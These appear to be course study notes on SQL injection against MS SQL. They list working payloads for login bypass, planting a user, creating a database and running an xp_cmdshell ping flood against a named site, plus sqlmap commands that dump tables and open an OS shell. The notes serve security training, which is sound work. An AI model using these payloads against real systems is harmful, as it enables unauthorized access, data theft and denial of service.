# Module 15 - SQL Injection #

## SQL Injection on an MS SQL Database ##

``` blah' or 1=1 -- - ```
``` blah'; insert into login values('john','apple123'); -- - ``` - Inserting a new user into the table 'login'
``` blah'; create database mydatabase; -- - ``` - Creating a new database
``` blah'; exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; -- - ``` - To perform a DoS to a site

### SQLMap ###
``` sqlmap -u <URL with Parameters - Ex. /?id=1> --cookie=<document.cookie> --dbs ``` - It tampers with the parameters in the URL to attempt to extract database information

``` sqlmap -u <URL with Parameters - Ex. /?id=1> --cookie=<document.cookie> -D <Database Name> ``` - It displays info about the specific database

``` sqlmap -u <URL with Parameters - Ex. /?id=1> --cookie=<document.cookie> -D <Database Name> -T <Table> --columns ``` - It displays the columns of the specified table

``` sqlmap -u <URL with Parameters - Ex. /?id=1> --cookie=<document.cookie> -D <Database Name> -T <Table> --dump ``` - It dumps all the info about the specified table

``` sqlmap -u <URL with Parameters - Ex. /?id=1> --cookie=<document.cookie> --os-shell ``` - To execute an os shell


- - - -

## Scanning Web Applications ##

### N-Stalker ###
1. Enter the URL and the 'OWASP Policy' Scan Policy. Leave everything else to default.
2. 'Start Scan'

It shows the website tree, the vulnerabilities found, objects, stats...
